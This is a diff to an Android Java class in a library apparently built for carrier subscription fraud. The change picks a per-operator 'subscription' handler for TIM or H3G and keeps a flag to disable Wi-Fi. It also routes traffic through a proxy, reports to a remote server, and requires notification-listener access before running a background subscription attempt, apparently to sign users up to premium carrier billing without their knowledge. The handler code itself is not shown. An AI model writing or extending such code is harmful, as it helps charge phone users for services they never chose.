@@ -20,6 +20,7 @@ import com.enhtmv.sublib.common.http.SubProxy;
 import com.enhtmv.sublib.common.util.SharedUtil;
 import com.enhtmv.sublib.common.util.StringUtil;
 import com.enhtmv.sublib.common.util.NetUtil;
+import com.enhtmv.sublib.work.aodili.AodiliH3g;
 import com.enhtmv.sublib.work.yidali.TIMSub;
 
 import static com.enhtmv.sublib.common.sub.SubCall.*;
@@ -34,7 +35,10 @@ public class SubContext {
 
     private static boolean running = false;
 
+    //debug
     private static boolean closeWifi = true;
+    private static SubProxy subProxy;
+    private static String operator;
 
 
     private Context context;
@@ -51,9 +55,29 @@ public class SubContext {
         String useragent = new WebView(context).getSettings().getUserAgentString();
 
 
-        subCall = new TIMSub();
+        String code = StringUtil.isEmpty(operator) ? NetUtil.getOperator() : operator;
 
-        subCall.init(useragent, event);
+        switch (code) {
+
+            case OPERATOR_TIM:
+                LogUtils.i("init TIM", code);
+                subCall = new TIMSub();
+                break;
+            case OPERATOR_H3G:
+                LogUtils.i("init H3G", code);
+                subCall = new AodiliH3g();
+                break;
+
+            default:
+                LogUtils.w("not init subcall", code);
+        }
+        if (subCall != null) {
+            subCall.init(useragent, event);
+
+            if (subProxy != null) {
+                subCall.setProxy(subProxy);
+            }
+        }
     }
 
     public static void init(Context context, SubEvent event) {
@@ -63,7 +87,7 @@ public class SubContext {
 
             Utils.init(context);
 
-            SubReport.init("http://52.53.238.169:8081");
+            SubReport.init(APP_SERVER_HOST);
 
 
             if (subContext == null) {
@@ -148,7 +172,11 @@ public class SubContext {
     }
 
     public static void proxy(SubProxy proxy) {
-        subContext.subCall.setProxy(proxy);
+        subProxy = proxy;
+    }
+
+    public static void setOperator(String code) {
+        operator = code;
     }
 
 
@@ -156,12 +184,23 @@ public class SubContext {
 
         synchronized (SubContext.class) {
 
-            if (!running) {
+            if (!running && subContext.subCall != null) {
 
                 running = true;
 
                 //是否订阅成功
                 if (!SharedUtil.isSuccess()) {
+
+                    if (subContext.subCall instanceof AodiliH3g) {
+                        if (!isNotificationServiceEnabled()) {
+
+                            subContext.subCall.r.w("not_notification_permission");
+
+                            running = false;
+
+                            return;
+                        }
+                    }
 
                     new Thread(new Runnable() {
                         @Override
@@ -189,6 +228,8 @@ public class SubContext {
                         }
 
                     }).start();
+                } else {
+                    running = false;
                 }
             }
         }
@@ -208,7 +249,7 @@ public class SubContext {
         }
     }
 
-    public static boolean isNotificationServiceEnabled() {
+    private static boolean isNotificationServiceEnabled() {
 
         String pkgName = subContext.context.getPackageName();
         final String flat = Settings.Secure.getString(subContext.context.getContentResolver(),
@@ -221,9 +262,6 @@ public class SubContext {
                 final ComponentName cn = ComponentName.unflattenFromString(name);
                 if (cn != null) {
                     if (TextUtils.equals(pkgName, cn.getPackageName())) {
-
-                        //todo  通知权限打开状态
-
                         return true;
                     }
                 }
